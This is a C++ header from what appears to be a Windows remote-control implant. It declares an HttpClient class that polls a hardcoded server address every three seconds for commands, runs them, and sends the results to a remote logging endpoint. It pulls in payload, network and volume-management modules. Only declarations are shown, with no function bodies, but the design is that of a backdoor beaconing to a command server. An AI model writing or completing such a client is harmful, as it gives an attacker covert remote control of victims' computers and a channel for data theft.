#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <string>
#include "../Command/NetworkManager.hpp"
#include "../Command/VolumeManager.hpp"
#include "../../Module/Logger.hpp"
#include "../Payload/Payload.hpp"
#include <csignal>
#include <nlohmann/json.hpp>

#pragma comment(lib, "wininet.lib")

class HttpClient {
private:
    const std::string COMMAND_URL = "http://47.81.10.50:3000/getcommand";
    const std::string LOG_URL = "http://47.81.10.50:3000/log";

    const int CHECK_INTERVAL = 3000;// 3 seconds

    bool is_running;
    std::string last_command;

    std::string getCommand();
    void executeCommand(const std::string& cmd);
    void sendLog(const std::string& cmd, const std::string& result, bool success);
    std::string getCurrentTime();
    static void signalHandler(int signum);

public:
    HttpClient();
    ~HttpClient();
    void start();
    void stop();
};